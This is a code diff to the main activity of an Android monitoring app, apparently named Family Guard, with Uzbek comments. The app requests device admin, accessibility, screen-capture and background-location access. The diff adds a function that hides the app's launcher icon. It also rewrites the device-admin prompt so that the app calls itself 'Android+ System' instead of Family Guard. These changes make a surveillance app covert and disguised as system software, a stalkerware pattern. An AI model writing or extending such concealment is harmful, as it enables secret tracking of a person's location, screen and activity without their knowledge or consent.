@@ -4,6 +4,7 @@ import android.Manifest
 import android.app.Activity
 import android.app.AlarmManager
 import android.app.admin.DevicePolicyManager
+import android.content.ComponentName
 import android.content.Intent
 import android.content.pm.PackageManager
 import android.media.projection.MediaProjectionManager
@@ -30,7 +31,12 @@ class MainActivity : AppCompatActivity() {
     private lateinit var tvPairing: TextView
     private lateinit var tvStatus: TextView
     private lateinit var dpm: DevicePolicyManager
-    private lateinit var adminComp: android.content.ComponentName
+    private lateinit var adminComp: ComponentName
+
+    // Launcher alias — manifest dagi activity-alias nomi bilan mos
+    private val launcherAlias by lazy {
+        ComponentName(packageName, "$packageName.LauncherAlias")
+    }
 
     private val screenLauncher = registerForActivityResult(
         ActivityResultContracts.StartActivityForResult()
@@ -83,7 +89,7 @@ class MainActivity : AppCompatActivity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
-        adminComp = android.content.ComponentName(this, DeviceAdminReceiver::class.java)
+        adminComp = ComponentName(this, DeviceAdminReceiver::class.java)
 
         val root = LinearLayout(this).apply {
             orientation = LinearLayout.VERTICAL
@@ -108,6 +114,7 @@ class MainActivity : AppCompatActivity() {
         root.addView(makeBtn(
             if (dpm.isAdminActive(adminComp)) "✅ Device Admin yoqilgan" else "🔐 Device Admin yoqish"
         ) { requestAdmin() })
+        root.addView(makeBtn("👁️ Ikonkani yashirish") { hideAppIcon() })
 
         setContentView(root)
 
@@ -146,6 +153,26 @@ class MainActivity : AppCompatActivity() {
         if (::tvStatus.isInitialized) tvStatus.text = msg
     }
 
+    // ✅ Ikonkani yashirish — alias orqali
+    private fun hideAppIcon() {
+        try {
+            val isHidden = packageManager.getComponentEnabledSetting(launcherAlias) ==
+                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED
+            if (isHidden) {
+                setStatus("ℹ️ Ikonka allaqachon yashirilgan")
+                return
+            }
+            packageManager.setComponentEnabledSetting(
+                launcherAlias,
+                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                PackageManager.DONT_KILL_APP
+            )
+            setStatus("✅ Ikonka yashirildi\n(Launcher yangilanguncha 5-10 soniya kuting)")
+        } catch (e: Exception) {
+            setStatus("❌ Xatolik: ${e.message}")
+        }
+    }
+
     private fun requestAccessibility() {
         if (FamilyGuardAccessibilityService.isEnabled()) {
             setStatus("✅ Accessibility Service yoqilgan"); return
@@ -177,14 +204,11 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun requestLocation() {
-        val fine = ContextCompat.checkSelfPermission(
-            this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED
-        val coarse = ContextCompat.checkSelfPermission(
-            this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED
+        val fine   = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)   == PackageManager.PERMISSION_GRANTED
+        val coarse = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED
         if (fine || coarse) {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-                val bg = ContextCompat.checkSelfPermission(
-                    this, Manifest.permission.ACCESS_BACKGROUND_LOCATION) == PackageManager.PERMISSION_GRANTED
+                val bg = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION) == PackageManager.PERMISSION_GRANTED
                 if (!bg) bgLocLauncher.launch(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
                 else setStatus("✅ Lokatsiya ruxsati bor (background)")
             } else setStatus("✅ Lokatsiya ruxsati bor")
@@ -246,7 +270,7 @@ class MainActivity : AppCompatActivity() {
         if (dpm.isAdminActive(adminComp)) { setStatus("✅ Admin allaqachon yoqilgan"); return }
         startActivity(Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
             putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComp)
-            putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Family Guard nazorat uchun.")
+            putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Android+ System nazorat uchun.")
         })
     }
 }
